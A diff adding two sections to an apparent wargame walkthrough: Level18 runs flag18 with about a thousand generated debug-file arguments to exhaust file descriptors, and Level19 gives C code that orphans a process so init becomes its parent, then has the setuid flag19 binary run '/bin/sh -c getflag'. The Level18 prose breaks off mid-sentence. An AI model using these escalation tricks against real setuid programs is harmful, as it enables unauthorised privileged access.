@@ -264,4 +264,38 @@ when I checked for the file /tmp/level17_test I saw that getflag ran successfull
 
 # Level18
 
+In this level we have a program that has a bunch of features but the two that I focused
+on are the "shell" and "login" functions. The shell function is pretty self-explanatory:
+it calls execve with "/bin/sh" and passes the 
+./flag18 --rcfile abc -d /dev/tty `python -c "for i in xrange(1020): print '-d /tmp/fd_{}'.format(i),"`
+
+# Level19!
+This program checks if the parent process of itself is owned by root. In order to 
+make it be owned by root we make it an orphan process an pass it to init with
+the following program:
+
+	#include <stdio.h>
+	#include <sys/types.h>
+	#include <unistd.h>
+
+	int main(int argc, char ** argv)
+	{
+	    // Create a child process
+	    int pid = fork();
+
+	    if (pid > 0)
+	        printf("in parent process\n");
+
+	    // Note that pid is 0 in child process
+	    // and negative if fork() fails
+	    else if (pid == 0)
+	    {
+	        sleep(30); // Wait until parent dies and we become an orphan process
+	        printf("in child process\n");
+		printf("PPID=%d\n", getppid());
+		execl("/home/flag19/flag19", "/bin/sh", "-c", "getflag");
+	    }
+	
+	    return 0;
+	}
 
